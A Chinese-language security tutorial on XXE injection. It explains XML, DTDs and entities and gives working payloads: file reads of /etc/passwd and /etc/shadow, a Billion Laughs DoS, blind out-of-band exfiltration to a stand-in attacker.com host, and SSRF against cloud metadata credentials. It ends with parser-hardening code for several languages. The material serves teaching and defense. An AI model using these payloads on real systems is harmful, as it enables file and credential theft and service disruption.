### 概述 (Overview)

XXE (XML External Entity Injection) 是一种常见的 Web 安全漏洞，发生在应用程序解析 XML 输入时，未能安全地配置 XML 解析器或未能充分验证用户输入，导致其处理了**外部实体 (External Entities)** 的引用。攻击者可以通过构造包含恶意外部实体声明的 XML 数据，强制服务器端的 XML 解析器访问其本不应访问的资源。

这可能导致多种严重后果，包括：

*   **信息泄露:** 读取服务器本地文件（如配置文件、源代码、密码文件）、系统敏感信息。
*   **服务器端请求伪造 (SSRF):** 使服务器向内部网络或其他任意外部服务器发起请求，用于扫描内部网络、攻击内部服务或与其他系统交互。
*   **拒绝服务 (DoS):** 通过引用特殊文件（如 `/dev/random`）或构造递归实体（"Billion Laughs Attack"）耗尽服务器资源。
*   **远程代码执行 (RCE):** 在某些特定环境下（如安装了特定 PHP expect 扩展），可能导致执行任意代码。

**触发条件 (PHP 示例)**:
*   使用的底层 `libxml2` 库版本低于 2.9.0（较老版本默认启用外部实体加载）。
*   或者，代码中显式调用了 `libxml_disable_entity_loader(false);` (即禁用了禁用外部实体加载的安全设置)。

**学习参考**: [先知社区 - XXE 漏洞利用技巧](https://xz.aliyun.com/t/3357) (或其他权威的 XXE 资源)

### XML 与相关技术基础 (XML and Related Technologies Basics)

#### XML (可扩展标记语言 - Extensible Markup Language)

*   **用途:** 设计用来存储和传输结构化数据。其格式既方便人类阅读，也易于机器解析。广泛应用于配置文件、数据交换（Web 服务如 SOAP、旧版 REST API）、文档格式（如 Office Open XML - .docx, .xlsx）。
*   **语法规则:**
    *   必须有且仅有一个根元素。
    *   所有元素必须有匹配的结束标签 (`<tag>...</tag>`) 或使用自闭合标签 (`<tag/>`)。
    *   标签区分大小写。
    *   元素必须正确嵌套。
    *   属性值必须用引号（单引号或双引号）包围。
    *   特殊字符（如 `<`, `>`, `&`, `'`, `"`）需使用字符实体表示 (`&lt;`, `&gt;`, `&amp;`, `&apos;`, `&quot;`)。
*   **示例 XML 文档:**
    ```xml
    <?xml version="1.0" encoding="UTF-8"?> <!-- XML 声明 -->
    <user id="1"> <!-- 根元素 "user" 及其属性 "id" -->
       <name>John</name> <!-- 子元素 "name" -->
       <age>30</age>   <!-- 子元素 "age" -->
       <address>      <!-- 嵌套元素 "address" -->
          <street>123 Main St</street>
          <city>Anytown</city>
       </address>
    </user>
    ```

#### DTD (文档类型定义 - Document Type Definition)

*   **用途:** 定义 XML 文档的合法结构和约束（允许的元素、属性、嵌套关系、数据类型等）。相当于 XML 的“模式”或“语法规则”。
*   **目的:**
    *   **验证 (Validation):** 确保 XML 文档符合预定义的结构标准，对数据完整性很重要。
    *   **实体声明 (Entity Declaration):** DTD 是声明 XML 实体的标准位置，**这是 XXE 漏洞的关键**。
*   **引用方式:**
    1.  **内部 DTD:** 直接嵌入在 XML 文档的 `<!DOCTYPE ... [...]>` 声明中。
        ```xml
        <?xml version="1.0"?>
        <!DOCTYPE note [ <!-- DOCTYPE 声明开始 -->
          <!ELEMENT note (to, from, heading, body)> <!-- 定义 note 元素的结构 -->
          <!ELEMENT to (#PCDATA)>         <!-- 定义 to 元素内容为文本 -->
          <!ELEMENT from (#PCDATA)>
          <!ELEMENT heading (#PCDATA)>
          <!ELEMENT body (#PCDATA)>
          <!ENTITY writer "John Doe">     <!-- 定义内部实体 -->
        ]> <!-- DTD 结束 -->
        <note>
          <to>Tove</to>
          <from>&writer;</from> <!-- 使用实体 -->
          <heading>Reminder</heading>
          <body>Don't forget me this weekend!</body>
        </note>
        ```
    2.  **外部 DTD:** 存储在单独的文件中，通过 `SYSTEM` (私有 DTD) 或 `PUBLIC` (公共 DTD) 关键字在 `<!DOCTYPE>` 声明中引用。
        ```xml
        <!-- 引用私有 DTD -->
        <!DOCTYPE rootElement SYSTEM "path/to/mydtd.dtd">
        <!-- 引用公共 DTD -->
        <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
        ```
*   **DTD 参考**: [W3School DTD 教程](http://www.w3school.com.cn/dtd/index.asp)

#### XML 实体 (XML Entities)

实体是 XML 中用于表示**命名常量**或**引入外部内容**的机制，类似于变量或宏。它们在 DTD 中声明。

1.  **内部实体 (Internal Entity):**
    *   **定义:** 在 DTD 内部定义，其值是一个固定的字符串。
    *   **语法:** `<!ENTITY entityName "entityValue">`
    *   **示例:**
        ```dtd
        <!ENTITY company "My Example Corp.">
        <!ENTITY copyright "&#169; 2024 &company;"> <!-- 实体值可以包含其他实体引用 -->
        ```
    *   **用途:** 定义常量、简化重复内容、表示特殊字符。

2.  **外部实体 (External Entity):**
    *   **定义:** 引用存储在 XML 文档**外部**的资源。其值由该外部资源的内容决定。使用 `SYSTEM` 关键字指定资源的 URI (Uniform Resource Identifier)。
    *   **语法:** `<!ENTITY entityName SYSTEM "URI">`
    *   **URI 协议:** 可以是 `file://` (访问本地文件), `http://`, `https://`, `ftp://` (访问网络资源) 等，取决于 XML 解析器的支持。
    *   **示例:**
        ```dtd
        <!ENTITY fileContent SYSTEM "file:///c:/boot.ini">
        <!ENTITY webContent SYSTEM "http://example.com/data.txt">
        <!ENTITY networkShare SYSTEM "file:////fileserver/share/config.xml">
        ```
    *   **XXE 漏洞的核心利用点:** 如果应用程序解析包含外部实体的 XML，并且未禁用外部实体处理，攻击者可以通过控制 `SYSTEM` 后的 URI 来强制服务器访问任意资源。

3.  **参数实体 (Parameter Entity):**
    *   **定义:** 使用 `<!ENTITY % entityName "entityValue">` 或 `<!ENTITY % entityName SYSTEM "URI">` 定义 (注意中间的 `%` 号)。
    *   **引用:** **只能在 DTD 内部**使用 `%entityName;` 引用 (注意前缀 `%`)。
    *   **用途:**
        *   在 DTD 内部定义可重用的 DTD 片段或参数。
        *   **关键:** **加载外部 DTD 文件**。这是实现复杂 XXE 攻击（尤其是 Blind XXE OOB）的核心机制。参数实体可以引用包含其他 DTD 声明（包括更多实体定义）的外部文件。
    *   **示例 (加载外部 DTD):**
        ```dtd
        <!-- 在主 XML 的 DTD 中 -->
        <!ENTITY % externalDTD SYSTEM "http://attacker.com/malicious.dtd">
        %externalDTD; <!-- 在 DTD 内部引用参数实体，会加载并解析 malicious.dtd 的内容 -->
        ```

4.  **通用实体 (General Entity):**
    *   **定义:** 使用 `<!ENTITY entityName ...>` (没有 `%`) 定义，可以是内部或外部实体。
    *   **引用:** **只能在 XML 文档的内容部分** (标签之间或属性值中，取决于配置) 使用 `&entityName;` 引用 (注意前缀 `&`)。
    *   **XXE 利用场景:** 在有回显的 XXE 中，通常定义一个外部通用实体指向目标资源，然后在 XML 内容中引用它，期望其内容被回显。

5.  **字符实体 (Character Entity):**
    *   **用途:** 用于表示 XML 中的预留字符或无法直接输入的字符。
    *   **示例:** `&lt;` (`<`), `&gt;` (`>`), `&amp;` (`&`), `&apos;` (`'`), `&quot;` (`"`), `&#169;` (©), `&#x20AC;` (€)。
    *   它们不是 XXE 漏洞直接利用的对象，但在构造 payload 时可能需要用来转义特殊字符。

#### XSLT (可扩展样式表语言转换 - Extensible Stylesheet Language Transformations)

*   **用途:** 一种用于将 XML 文档转换为其他格式（如 HTML、纯文本或其他 XML 结构）的语言。
*   **与 XXE 的关系:**
    *   XSLT 自身通常不直接导致 XXE，但处理 XSLT 的**解析器**如果配置不当，仍然可能受到 XXE 攻击（因为 XSLT 文件本身也是 XML）。
    *   在某些高级 XXE 攻击场景中，攻击者可能尝试注入或控制 XSLT 转换过程，以间接实现信息泄露或执行代码（但这超出了典型 XXE 的范畴，更接近 XSLT 注入）。
    *   XSLT 的 `document()` 函数可以加载外部 XML 文件，如果其参数可控且解析器允许，可能被滥用。

#### XML 解析器 (XML Parsers)

*   **作用:** 读取 XML 文档，检查其语法是否符合规则，并将其转换为应用程序可以理解和使用的数据结构（如 DOM 树、SAX 事件流）。
*   **常见类型:**
    *   **DOM (Document Object Model):** 将整个 XML 加载到内存中，构建一个树状结构，允许随机访问。资源消耗大，不适合大文件。
    *   **SAX (Simple API for XML):** 基于事件的流式解析器，顺序读取 XML，触发事件（如开始标签、结束标签、文本内容），内存效率高，适合大文件，但访问不灵活。
    *   **StAX (Streaming API for XML):** 另一种流式解析器，结合了 DOM 和 SAX 的一些优点，提供拉式（pull）解析模型。
    *   **XPath 解析器:** 用于在 XML 文档中导航和选择节点，常与 XSLT 结合。
*   **与 XXE 的关系:** **XML 解析器的配置**直接决定了应用程序是否容易受到 XXE 攻击。特别是解析器如何处理 DTD、外部实体和参数实体的设置至关重要。不同的解析器库（如 `libxml2` in PHP/Python, JAXP in Java, `System.Xml` in .NET）有不同的默认行为和安全配置选项。

### 寻找与利用 XXE 漏洞 (Finding and Exploiting XXE)

#### 如何寻找 XXE 漏洞 (Finding XXE Vulnerabilities)

1.  **识别 XML 输入点:**
    *   **检查 `Content-Type` Header:** 寻找值为 `application/xml`, `text/xml`, `application/soap+xml` 等的 HTTP 请求。请求体是主要的测试目标。
    *   **检查 `Accept` Header:** 如果服务器响应表明它能接受 XML (`Accept: application/xml`)，即使当前请求不是 XML，也可以尝试修改 `Content-Type` 并发送 XML payload。
    *   **修改 JSON 为 XML:** 对于接收 JSON (`application/json`) 的 API 端点，尝试将 `Content-Type` 改为 `application/xml`，将请求体转换为等效的 XML 结构，并注入 XXE payload。服务器可能配置为同时支持两种格式。
    *   **文件上传功能:** 检查处理基于 XML 的文件格式（如 `.xml`, `.svg`, `.docx`, `.xlsx`, `.pptx`, `.fodt`, `.pdf` (某些特性)）的上传点。这些文件内部可能包含可被利用的 XML 结构。

2.  **测试注入:**
    *   向识别出的 XML 输入点发送包含简单外部实体声明的测试 payload，观察服务器响应。
    *   **基础探测 Payload (有回显):**
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE test [ <!ENTITY xxe "TEST_XXE_VULNERABLE" > ]>
        <data>&xxe;</data>
        ```
        如果响应中出现 "TEST_XXE_VULNERABLE"，则确认存在 XXE。
    *   **基础探测 Payload (OOB - 使用 DNSLog):**
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://YOUR_UNIQUE_ID.dnslog.cn" > %xxe; ]>
        <data></data>
        ```
        如果 DNSLog 平台收到来自目标服务器的 DNS 查询记录，则确认存在 XXE (可能是盲注)。

#### XXE 利用场景 (Exploitation Scenarios)

XXE 利用主要分为两大类，取决于是否能直接在响应中看到注入实体的内容：

*   **有回显 (In-band XXE / Classic XXE):** 攻击者可以直接在应用程序的 HTTP 响应中看到被引用的外部实体内容。
*   **无回显 / 盲注 (Out-of-band XXE / Blind XXE):** 应用程序处理了外部实体，但其内容没有在响应中返回。需要利用带外通道（OOB）来传输数据。

##### 1. 有回显 XXE (Exploiting XXE with Direct Feedback)

*   **利用通用实体读取本地文件:**
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [
      <!ENTITY fileContent SYSTEM "file:///etc/passwd"> <!-- Windows: "file:///c:/windows/win.ini" -->
    ]>
    <userInput>&fileContent;</userInput> <!-- 在 XML 内容中引用 -->
    ```
    如果应用程序回显了 `<userInput>` 标签内的内容，就会显示 `/etc/passwd` 的内容。

*   **利用参数实体和外部 DTD (间接读取):**
    有时直接引用外部通用实体可能被过滤，但允许引用外部参数实体。
    **发送到服务器的 XML:**
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [
      <!ENTITY % externalDTD SYSTEM "http://attacker.com/external.dtd">
      %externalDTD; <!-- 加载并解析外部 DTD -->
    ]>
    <data>&content;</data> <!-- 引用在 external.dtd 中定义的实体 -->
    ```
    **攻击者服务器上的 `external.dtd` 文件:**
    ```dtd
    <!ENTITY content SYSTEM "file:///etc/shadow">
    ```

*   **实体扩展攻击 (Billion Laughs Attack - DoS):**
    通过定义递归实体，导致解析器在展开实体时指数级地消耗内存和 CPU，造成拒绝服务。
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
     <!-- ... 重复定义更多层 ... -->
     <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <lolz>&lol9;</lolz>
    ```

##### 2. 无回显 / 盲 XXE (Exploiting Blind XXE using Out-of-Band Techniques)

当无法直接看到文件内容时，需要构造 payload，让服务器将数据发送到攻击者控制的外部服务器。

*   **核心技术:** 利用**参数实体**嵌套，触发对外部 DTD 的请求，并在外部 DTD 中构造一个**新的实体声明**，该声明的 `SYSTEM` URI 包含要窃取的数据，并指向攻击者的服务器。

*   **Payload 结构:**
    **发送到目标服务器的 XML (OOB Payload):**
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE data [
      <!ENTITY % remoteDTD SYSTEM "http://attacker.com/oob.dtd"> <!-- 1. 加载攻击者的 DTD -->
      %remoteDTD; <!-- 2. 解析攻击者的 DTD -->
      %fetchAndSend; <!-- 3. 引用在 oob.dtd 中定义的“执行”实体 -->
    ]>
    <data>ignored</data>
    ```
    **攻击者服务器上的 `oob.dtd` 文件:**
    ```dtd
    <!-- oob.dtd -->
    <!-- a. 定义参数实体 %file，读取目标文件并进行 Base64 编码 -->
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">

    <!-- b. 定义参数实体 %wrapper，其内容是另一个实体声明 -->
    <!-- 这个内部实体声明 (%send) 将在被解析时构造包含 %file 内容的 URL 并发起请求 -->
    <!-- 注意：内部的 % 符号需要进行参数实体编码，写为 &#x25; 或 % -->
    <!ENTITY % wrapper "<!ENTITY % send SYSTEM 'http://attacker.com:1337/?data=%file;'>">

    <!-- c. 引用 %wrapper 实体，这会导致内部的 %send 实体被声明 -->
    %wrapper;

    <!-- d. 定义一个“执行”实体 (名字任意, 如 fetchAndSend), 用于触发 %send -->
    <!-- 实际上, 在上一步 %wrapper 被解析时，%send 的声明已经包含了 %file 的解析和 URL 的构造 -->
    <!-- 并在 %send 被声明的同时可能就触发了请求 (取决于解析器行为) -->
    <!-- 有时需要显式引用 %send; 来确保触发, 但很多情况下 %wrapper; 就足够了 -->
    <!-- 为了兼容性，可以保留一个触发实体，虽然可能不是严格必需的 -->
    <!ENTITY % fetchAndSend ''>
    <!-- 或者，如果解析器需要显式触发外部请求 -->
    <!-- %send; -->
    ```

*   **执行流程:**
    1.  目标服务器解析 XML，遇到 `%remoteDTD;`，向 `http://attacker.com/oob.dtd` 发起请求。
    2.  服务器获取 `oob.dtd` 并开始解析其内容。
    3.  解析到 `%wrapper;` 时，其内容（`<!ENTITY % send SYSTEM 'http://attacker.com:1337/?data=%file;'>`）被处理。
    4.  在这个处理过程中，内部的 `%file;` 被解析，触发对 `file:///etc/passwd` 的读取和 Base64 编码。
    5.  然后，`%send` 实体被**声明**，其 `SYSTEM` URI 包含了编码后的文件内容。
    6.  **关键:** 很多 XML 解析器在**声明**一个包含外部引用的参数实体时，就会**立即尝试解析该 URI**以验证其有效性或获取资源。因此，声明 `%send` 的动作本身就触发了对 `http://attacker.com:1337/?data=<base64_data>` 的 HTTP GET 请求。
    7.  攻击者监听 `attacker.com` 的 1337 端口（例如使用 `python3 -m http.server 1337` 或 `nc -lvp 1337`），在其访问日志中找到包含 `?data=` 的请求。
    8.  提取 `data` 参数的值，进行 Base64 解码，即可获得 `/etc/passwd` 的内容。

*   **查看数据:** 主要依赖于监听攻击者控制的服务器（HTTP 服务器、DNS Log 服务器如 `dnslog.cn` 或 Burp Collaborator）的日志。有时，如果 OOB 请求失败或格式错误，相关的错误信息可能（不常见地）泄露在应用程序的响应中。

##### 3. 利用 XXE 进行 SSRF (Server-Side Request Forgery)

XXE 天然地可以用来发起 SSRF 攻击，因为外部实体可以引用 HTTP/HTTPS URL。

*   **扫描内部网络:**
    ```xml
    <!DOCTYPE ssrf [ <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/internal-app"> ]>
    <data>&xxe;</data>
    ```
    通过改变 IP 地址和端口，可以探测内部网络。响应（如果有回显）或错误信息（盲注时）可以判断目标是否可达或服务是否存在。
*   **与内部服务交互:** 可以尝试向已知的内部 API 端点发送请求。
*   **攻击云环境元数据:**
    ```xml
    <!DOCTYPE cloud [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"> ]>
    <data>&xxe;</data>
    ```
    尝试访问 AWS、GCP、Azure 等云服务商的元数据接口，可能泄露临时凭证。

### XXE 漏洞修复与防御 (Remediation and Defense)

防御 XXE 的核心是**禁用或安全地配置 XML 解析器的外部实体和 DTD 处理功能**。

1.  **禁用外部实体和 DTD 处理 (最有效、最推荐):**
    *   **通用原则:** 查找并设置选项以禁用：
        *   外部通用实体 (`external-general-entities`)
        *   外部参数实体 (`external-parameter-entities`)
        *   DOCTYPE 声明 (`disallow-doctype-decl`)
        *   加载外部 DTD (`load-external-dtd`)
    *   **PHP (`libxml2 >= 2.9.0` 推荐):**
        ```php
        // 关键：在解析前调用此函数，全局禁用实体加载
        libxml_disable_entity_loader(true);

        // 使用 DOMDocument
        $dom = new DOMDocument();
        // 默认情况下 (libxml >= 2.9.0)，外部实体已禁用，但显式设置更安全
        $dom->loadXML($xml_string, LIBXML_NONET); // LIBXML_NONET 禁用网络访问 (对 OOB/SSRF 有效)

        // 使用 SimpleXML
        // 重要：默认的 simplexml_load_string 会解析实体（不安全）
        // 需要结合 libxml_disable_entity_loader(true) 或传递安全选项
        $xml = simplexml_load_string($xml_string, 'SimpleXMLElement', LIBXML_NONET);
        ```
    *   **Java (JAXP - `DocumentBuilderFactory`):**
        ```java
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        // 设置安全特性 (OWASP 推荐)
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        dbf.setXIncludeAware(false); // 禁用 XInclude
        dbf.setExpandEntityReferences(false); // 不展开实体引用
        DocumentBuilder builder = dbf.newDocumentBuilder();
        // ... builder.parse(...) ...
        ```
        (对于其他 Java XML 库如 SAXParserFactory, StAX, JDOM, DOM4J 等，也需要类似地配置安全特性)
    *   **Python (`lxml`):**
        ```python
        from lxml import etree
        # 创建安全的解析器配置
        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False)
        # 使用此解析器进行解析
        xmlData = etree.fromstring(xml_string, parser=parser)
        # 或者解析文件
        # tree = etree.parse(file_path, parser=parser)
        ```
    *   **Python (内置 `xml.etree.ElementTree`):** 默认不解析外部实体，相对安全，但仍需注意第三方库可能改变其行为。
    *   **.NET (`System.Xml`):**
        ```csharp
        // 使用 XmlReader (推荐)
        XmlReaderSettings settings = new XmlReaderSettings();
        settings.XmlResolver = null; // 关键：禁用外部资源解析
        settings.DtdProcessing = DtdProcessing.Prohibit; // 禁止 DTD 处理
        using (XmlReader reader = XmlReader.Create(stream, settings))
        {
            // ... 处理 XML ...
        }

        // 使用 XmlDocument (不推荐直接加载不受信源)
        XmlDocument xmlDoc = new XmlDocument();
        xmlDoc.XmlResolver = null; // 必须设置 resolver 为 null
        // xmlDoc.Load(stream); // 加载前确保 resolver 已设为 null
        ```

2.  **使用更安全的数据格式:**
    *   如果业务场景允许，优先选用**JSON**等本身不支持 DTD 和外部实体的数据格式进行数据交换。

3.  **输入验证与过滤 (辅助手段，不可靠):**
    *   **验证:** 对 XML 数据进行结构验证（如使用 XSD Schema 而不是 DTD）。
    *   **过滤:** 尝试过滤 `<!DOCTYPE`, `<!ENTITY`, `SYSTEM`, `PUBLIC` 等关键字。**非常不推荐**作为主要防御手段，极易被绕过（如使用不同编码、CDATA、参数实体嵌套等）。

4.  **升级依赖库:**
    *   保持 XML 解析库和相关依赖是最新版本，以获取安全更新。

5.  **Web 应用防火墙 (WAF):**
    *   WAF 可能包含检测和阻止已知 XXE payload 的规则，可作为深度防御的一环，但不应依赖 WAF 作为唯一防护。